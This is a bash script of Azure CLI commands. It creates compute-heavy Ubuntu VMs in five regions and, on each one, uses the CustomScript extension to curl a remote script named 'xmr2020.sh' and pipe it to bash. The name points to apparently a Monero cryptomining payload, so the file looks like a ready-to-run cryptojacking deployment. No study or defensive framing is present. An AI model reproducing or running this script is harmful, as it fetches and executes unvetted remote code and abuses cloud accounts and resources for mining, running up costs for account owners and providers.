#!/bin/bash
az group create --name myResourceGroup3 --location centralus
az vm create \
    --resource-group myResourceGroup3 \
    --name myVM3 \
	--size Standard_F8 \
    --image UbuntuLTS \
    --admin-username azureuser \
    --generate-ssh-keys

az vm extension set \
  --publisher Microsoft.Azure.Extensions \
  --version 2.0 \
  --name CustomScript \
  --vm-name myVM3 \
  --resource-group myResourceGroup3 \
  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'

az group create --name myResourceGroup4 --location eastus

az vm create \
    --resource-group myResourceGroup4 \
    --name myVM11 \
	--size Standard_F8 \
    --image UbuntuLTS \
    --admin-username azureuser \
    --generate-ssh-keys

az vm extension set \
  --publisher Microsoft.Azure.Extensions \
  --version 2.0 \
  --name CustomScript \
  --vm-name myVM11 \
  --resource-group myResourceGroup4 \
   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'
  
az group create --name myResourceGroup2552 --location westus2


az vm create \
    --resource-group myResourceGroup2552 \
    --name myVM22 \
	--size Standard_F8s_v2 \
    --image UbuntuLTS \
    --admin-username azureuser \
    --generate-ssh-keys
  
az vm extension set \
  --publisher Microsoft.Azure.Extensions \
  --version 2.0 \
  --name CustomScript \
  --vm-name myVM22 \
  --resource-group myResourceGroup2552 \
   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'
   
az group create --name myResourceGroup32 --location eastus2


az vm create \
    --resource-group myResourceGroup32 \
    --name myVM44 \
	--size Standard_F8s_v2 \
    --image UbuntuLTS \
    --admin-username azureuser \
    --generate-ssh-keys
  
az vm extension set \
  --publisher Microsoft.Azure.Extensions \
  --version 2.0 \
  --name CustomScript \
  --vm-name myVM44 \
  --resource-group myResourceGroup32 \
   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'
   
   
az group create --name myResourceGroup48 --location northcentralus


az vm create \
    --resource-group myResourceGroup48 \
    --name myVM48 \
	--size Standard_F8s \
    --image UbuntuLTS \
    --admin-username azureuser \
    --generate-ssh-keys
  
az vm extension set \
  --publisher Microsoft.Azure.Extensions \
  --version 2.0 \
  --name CustomScript \
  --vm-name myVM48 \
  --resource-group myResourceGroup48 \
   --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/xmr2020.sh\" | bash"}'

